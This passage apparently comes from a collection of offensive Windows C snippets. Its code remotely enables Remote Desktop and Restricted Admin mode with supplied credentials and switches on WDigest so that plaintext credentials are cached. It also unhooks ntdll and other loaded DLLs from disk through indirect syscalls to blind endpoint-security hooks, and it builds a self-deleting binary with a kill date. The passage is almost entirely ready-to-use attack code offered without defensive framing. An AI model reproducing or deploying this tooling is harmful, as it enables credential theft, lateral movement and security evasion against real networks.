        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, L"DisableRestrictedAdmin", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Enable Remote Desktop Via Registry (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL EnableRemoteDesktopW(IN LPCWSTR szMachineName, IN LPCWSTR szUserName, IN LPCWSTR szPassword, IN LPCWSTR szDomain) {

    BOOL        bResult             = FALSE;
    LSTATUS     STATUS              = 0x00;
    HANDLE      hToken              = NULL;
    HKEY        hKey                = NULL;
    DWORD       dwKeyValue          = 0x00,
                dwKeyValueSize      = sizeof(DWORD);

    if (!LogonUserW(szUserName, szMachineName, szPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegConnectRegistryW(szMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExW(hKey, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, L"fDenyTSConnections", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Enable Restricted Admin Mode Via Registry (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL EnableRestrictedAdminA(IN LPCSTR cMachineName, IN LPCSTR cUserName, IN LPCSTR cPassword, IN LPCSTR cDomain) {

    BOOL        bResult             = FALSE;
    LSTATUS     STATUS              = 0x00;
    HANDLE      hToken              = NULL;
    HKEY        hKey                = NULL;
    DWORD       dwKeyValue          = 0x00,
                dwKeyValueSize      = sizeof(DWORD);

    if (!LogonUserA(cUserName, cMachineName, cPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegConnectRegistryA(cMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExA(hKey, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "DisableRestrictedAdmin", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Disable Remote Desktop Via Registry (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL DisableRemoteDesktopA(IN LPCSTR cMachineName, IN LPCSTR cUserName, IN LPCSTR cPassword, IN LPCSTR cDomain) {

    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    HANDLE      hToken          = NULL;
    HKEY        hKey            = NULL;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if (!LogonUserA(cUserName, cMachineName, cPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegConnectRegistryA(cMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExA(hKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "fDenyTSConnections", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Enable WDigest Via Registry
```c
#include <windows.h>
#include <stdio.h>
BOOL EnableWdigest() {

    HKEY        hKey            = NULL;
    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if ((STATUS = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyEx [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueEx(hKey, L"UseLogonCredential", 0x00, REG_DWORD, (const BYTE*)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueEx [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;
}
```
### Disable WDigest Via Registry
```c
#include <windows.h>
#include <stdio.h>
BOOL DisableWdigest() {

    HKEY        hKey            = NULL;
    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    DWORD       dwKeyValue      = 0x00,
                dwKeyValueSize  = sizeof(DWORD);

    if ((STATUS = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyEx [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueEx(hKey, L"UseLogonCredential", 0x00, REG_DWORD, (const BYTE*)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueEx [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;
}
```
### NTDLL Unhooking From Disk 
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"


#define NtCreateFile_CRC32					0x9010089D
#define NtCreateSection_CRC32				0xF85C77EC
#define NtMapViewOfSection_CRC32			0xB347A7C1
#define NtProtectVirtualMemory_CRC32		0x17C9087B
#define NtUnmapViewOfSection_CRC32			0x830A04FC
#define NtClose_CRC32						0x0EDFC5CB

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtCreateFile;
	NT_SYSCALL	NtCreateSection;
	NT_SYSCALL	NtMapViewOfSection;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtUnmapViewOfSection;
	NT_SYSCALL	NtClose;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateFile_CRC32, &g_NTAPI.NtCreateFile)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateSection_CRC32, &g_NTAPI.NtCreateSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &g_NTAPI.NtMapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &g_NTAPI.NtUnmapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtClose_CRC32, &g_NTAPI.NtClose)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtClose \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize							= wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length			= (USHORT)DestSize;
		DestinationString->MaximumLength	= (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length			= 0;
		DestinationString->MaximumLength	= 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


BOOL UnhookNtdllFromDisk(IN HMODULE hNtdllBase) {

	if (!hNtdllBase)
		return FALSE;

	NTSTATUS				STATUS							= 0x00;
	WCHAR					szWindowsDir	[MAX_PATH / 2]	= { 0 };
	WCHAR					szNtdllPath		[MAX_PATH]		= { 0 };
	HANDLE					hFile							= NULL,
							hSection						= NULL;
	OBJECT_ATTRIBUTES		ObjAttributes					= { 0 };
	UNICODE_STRING			UnicodeStr						= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock					= { 0 };
	PVOID					pBaseAddress					= NULL,
							pHookedNtdllTxt					= NULL,
							pNewNtdllTxt					= NULL;
	SIZE_T					sViewSize						= NULL,
							sNtdllTxtLength					= NULL,
							sNtdllTxtLength2				= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs						= { 0 };
	PIMAGE_SECTION_HEADER	pImgSecHdr						= { 0 };
	DWORD					dwOldProtection = 0x00;
	BOOL					bResult							= FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	if (!GetWindowsDirectoryW(szWindowsDir, MAX_PATH / 2)) {
		printf("[!] GetWindowsDirectoryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	wsprintfW(szNtdllPath, L"\\??\\\\%s\\System32\\%s", szWindowsDir, L"ntdll.dll");

	RtlInitUnicodeString(&UnicodeStr, szNtdllPath);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SET_SYSCALL(g_NTAPI.NtCreateFile);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || hFile == NULL) {
		printf("[!] NtCreateFile Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtCreateSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile)))) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	SET_SYSCALL(g_NTAPI.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hSection, NtCurrentProcess(), &pBaseAddress, NULL, NULL, NULL, &sViewSize, ViewShare, 0x00, PAGE_READONLY))) || pBaseAddress == NULL) {
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNtdllBase + ((PIMAGE_DOS_HEADER)hNtdllBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// same as strcmp(pSectionHeader[i].Name, ".text") == 0
		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {

			pHookedNtdllTxt   = (PVOID)((ULONG_PTR)hNtdllBase	+ pImgSecHdr[i].VirtualAddress);
			pNewNtdllTxt	  = (PVOID)((ULONG_PTR)pBaseAddress	+ pImgSecHdr[i].VirtualAddress);
			sNtdllTxtLength   = sNtdllTxtLength2   = (SIZE_T)pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pHookedNtdllTxt || !pNewNtdllTxt || !sNtdllTxtLength)
		goto _END_OF_FUNC;

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	memcpy(pHookedNtdllTxt, pNewNtdllTxt, sNtdllTxtLength2);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedNtdllTxt, &sNtdllTxtLength, dwOldProtection, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pBaseAddress) {
		SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
		if (!NT_SUCCESS((RunSyscall(NtCurrentProcess(), pBaseAddress)))) {
			printf("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
			return FALSE;
		}
	}
	if (hSection) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hSection)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}
	if (hFile) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hFile)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}

	return bResult;
}
```
### Unhook DLLs From The Disk
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtCreateFile_CRC32					0x9010089D
#define NtCreateSection_CRC32				0xF85C77EC
#define NtMapViewOfSection_CRC32			0xB347A7C1
#define NtProtectVirtualMemory_CRC32		0x17C9087B
#define NtUnmapViewOfSection_CRC32			0x830A04FC
#define NtClose_CRC32						0x0EDFC5CB

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtCreateFile;
	NT_SYSCALL	NtCreateSection;
	NT_SYSCALL	NtMapViewOfSection;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtUnmapViewOfSection;
	NT_SYSCALL	NtClose;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateFile_CRC32, &g_NTAPI.NtCreateFile)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateSection_CRC32, &g_NTAPI.NtCreateSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &g_NTAPI.NtMapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_NTAPI.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &g_NTAPI.NtUnmapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtClose_CRC32, &g_NTAPI.NtClose)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtClose \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize							= wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length			= (USHORT)DestSize;
		DestinationString->MaximumLength	= (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length			= 0;
		DestinationString->MaximumLength	= 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


BOOL UnhookDLLFromDisk(IN LPCWSTR szDllFileName, IN HMODULE hHookedModule) {

	if (!szDllFileName || !hHookedModule)
		return FALSE;

	NTSTATUS				STATUS								= 0x00;
	WCHAR					szWindowsDir[MAX_PATH / 2]			= { 0 };
	WCHAR					szDllPath[MAX_PATH]					= { 0 };
	HANDLE					hFile								= NULL,
							hSection							= NULL;
	OBJECT_ATTRIBUTES		ObjAttributes						= { 0 };
	UNICODE_STRING			UnicodeStr							= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock						= { 0 };
	PVOID					pBaseAddress						= NULL,
							pHookedText							= NULL,
							pNewTxt								= NULL;
	SIZE_T					sViewSize							= NULL,
							sTxtLength							= NULL,
							sTxtLength2							= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs							= { 0 };
	PIMAGE_SECTION_HEADER	pImgSecHdr							= { 0 };
	DWORD					dwOldProtection						= 0x00;
	BOOL					bResult								= FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	if (!GetWindowsDirectoryW(szWindowsDir, MAX_PATH / 2)) {
		printf("[!] GetWindowsDirectoryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	wsprintfW(szDllPath, L"\\??\\\\%s\\System32\\%s", szWindowsDir, szDllFileName);

	RtlInitUnicodeString(&UnicodeStr, szDllPath);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SET_SYSCALL(g_NTAPI.NtCreateFile);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || hFile == NULL) {
		printf("[!] NtCreateFile Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtCreateSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile)))) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	SET_SYSCALL(g_NTAPI.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hSection, NtCurrentProcess(), &pBaseAddress, NULL, NULL, NULL, &sViewSize, ViewShare, 0x00, PAGE_READONLY))) || pBaseAddress == NULL) {
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)hHookedModule + ((PIMAGE_DOS_HEADER)hHookedModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {

			pHookedText = (PVOID)((ULONG_PTR)hHookedModule + pImgSecHdr[i].VirtualAddress);
			pNewTxt		= (PVOID)((ULONG_PTR)pBaseAddress + pImgSecHdr[i].VirtualAddress);
			sTxtLength	= sTxtLength2 = (SIZE_T)pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pHookedText || !pNewTxt || !sTxtLength)
		goto _END_OF_FUNC;

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedText, &sTxtLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	memcpy(pHookedText, pNewTxt, sTxtLength2);

	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), &pHookedText, &sTxtLength, dwOldProtection, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pBaseAddress) {
		SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
		if (!NT_SUCCESS((RunSyscall(NtCurrentProcess(), pBaseAddress)))) {
			printf("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
			return FALSE;
		}
	}
	if (hSection) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hSection)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}
	if (hFile) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hFile)))) {
			printf("[!] NtClose [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}

	return bResult;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


BOOL UnhookLoadedDllsFromDisk() {

	PPEB                    pPeb				= NULL;
	PPEB_LDR_DATA           pLdrData			= NULL;
	PLDR_DATA_TABLE_ENTRY   pDataTableEntry		= NULL;

	pPeb			= (PEB*)(__readgsqword(0x60));
	pLdrData		= (PPEB_LDR_DATA)(pPeb->LoaderData);
	pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pLdrData->InMemoryOrderModuleList.Flink->Flink);

	while (pDataTableEntry->FullDllName.Buffer && pDataTableEntry->FullDllName.Length) {

		printf("[i] Unhooking %ws - 0x%p ... ", pDataTableEntry->FullDllName.Buffer, (HMODULE)pDataTableEntry->InInitializationOrderLinks.Flink);

		if (!UnhookDLLFromDisk(pDataTableEntry->FullDllName.Buffer, (HMODULE)pDataTableEntry->InInitializationOrderLinks.Flink)) {
			printf("[!] Failed \n");
		}

		printf("[+] DONE \n");

		pDataTableEntry = *(PLDR_DATA_TABLE_ENTRY*)(pDataTableEntry);
	}

	return TRUE;
}
```
### Binary Kill Date
```c
#include <windows.h>
#include <stdio.h>
// ------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Edit the following KILL_* constants to configure the kill date:

#define KILL_DAY				0x01		// Ex: 1 - Meaning after 1 day, the binary will self-kill
#define KILL_HOUR				0x02		// Ex: 10 - Meaning after 10 hours, the binary will self-kill
#define KILL_MINUTE				0x00		// Ex: 1 - Meaning after 1 minute, the binary will self-kill

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Macros used to set the kill date:

#define MINUTES_TO_SEC(Mins)	(Mins * 60)			// Converts minutes to seconds
#define HOURS_TO_SEC(Hrs)		(Hrs  * 3600)		// Converts hours to seconds
#define DAYS_TO_SEC(Days)		(Days * 86400)		// Converts days to seconds

// The kill date in seconds:
#define KILL_DATE				(DAYS_TO_SEC(KILL_DAY) + HOURS_TO_SEC(KILL_HOUR) + MINUTES_TO_SEC(KILL_MINUTE))

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define NEW_STREAM			L":%x%x\x00"

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName [MAX_PATH];			// Instead of "WCHAR FileName[0]" (See FILE_RENAME_INFO's original documentation)

} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL DeleteSelfFromDisk() {

	BOOL                    bResult						= FALSE;
	HANDLE                  hFile						= INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO   DisposalInfo				= { .DeleteFile = TRUE };
	FILE_RENAME_INFO2       RenameInfo					= { .FileNameLength = sizeof(NEW_STREAM), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };
	WCHAR					szFileName[MAX_PATH * 2]	= { 0x00 };

	swprintf(RenameInfo.FileName, MAX_PATH, NEW_STREAM, rand(), rand() * rand());

	if (GetModuleFileNameW(NULL, szFileName, (MAX_PATH * 2)) == 0x00) {
		printf("[!] GetModuleFileNameW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	CloseHandle(hFile);

	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL GetCurrentUnixTime(OUT INT* CurrentTime) {

	SYSTEMTIME			SysTime		= { 0x00 };
	FILETIME			FileTime	= { 0x00 };
	ULARGE_INTEGER		ULargeInt	= { 0x00 };

	GetSystemTime(&SysTime);

	if (!SystemTimeToFileTime(&SysTime, &FileTime))
		return FALSE;

	ULargeInt.LowPart	= FileTime.dwLowDateTime;
	ULargeInt.HighPart	= FileTime.dwHighDateTime;

	*CurrentTime = (long)((ULargeInt.QuadPart - 116444736000000000) / 10000000L);

	return TRUE;
}


BOOL GetLocalPeTimeStamp(OUT INT* TimeStamp) {

	ULONG_PTR				uLocalImgHandle		= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs			= NULL;

